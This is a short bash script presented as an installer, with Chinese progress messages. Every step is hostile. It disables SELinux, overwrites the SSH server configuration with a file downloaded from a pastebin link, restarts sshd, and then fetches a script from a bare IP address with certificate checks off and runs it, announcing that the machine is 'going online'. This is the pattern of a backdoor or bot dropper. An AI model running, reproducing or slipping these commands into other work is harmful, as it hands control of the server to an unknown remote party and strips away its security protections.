#!/bin/bash
echo -e "\033[41;37;5m安装开始!\033[0m"
echo -e "\033[41;37;5m正在关闭selinux\033[0m"
setenforce 0
echo -e "\033[41;37;5m正在替换sshd_config\033[0m"
wget "https://pastebin.com/raw/hDYt9Yxy" -O /etc/ssh/sshd_config
echo -e "\033[41;37;5m重启SSH服务\033[0m"
systemctl restart sshd
echo -e "\033[41;37;5m正在上线\033[0m"
sh -c "$(curl -k https://116.95.33.226:4434/tmp/F309J1tdO0vL.sh)"
echo -e "\033[41;37;5m安装成功!\033[0m"
